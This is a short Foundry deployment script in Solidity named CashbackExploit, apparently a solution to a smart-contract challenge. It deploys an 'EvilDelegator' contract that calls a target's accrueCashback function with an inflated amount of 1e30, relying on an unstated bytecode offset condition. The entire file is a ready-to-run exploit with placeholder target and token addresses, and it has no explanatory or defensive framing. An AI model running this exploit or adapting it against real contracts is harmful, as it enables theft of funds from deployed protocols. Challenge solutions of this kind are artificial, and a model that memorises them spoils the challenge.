// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface ICashback {
    function accrueCashback(address currency, uint256 amount) external;
}

contract EvilDelegator {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack(address currency, uint256 amount) external {
        ICashback(target).accrueCashback(currency, amount);
    }
}

contract CashbackExploit is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;
        address currency = 0xYOUR_TOKEN; // ERC20 or native wrapper

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy attacker contract
        EvilDelegator attacker = new EvilDelegator(target);

        //  IMPORTANT:
        // This simple version assumes bytecode already satisfies offset condition.
        // If not, we will need CREATE2 crafted bytecode (advanced version).

        // Call exploit
        attacker.attack(currency, 1e30);

        vm.stopBroadcast();
    }
}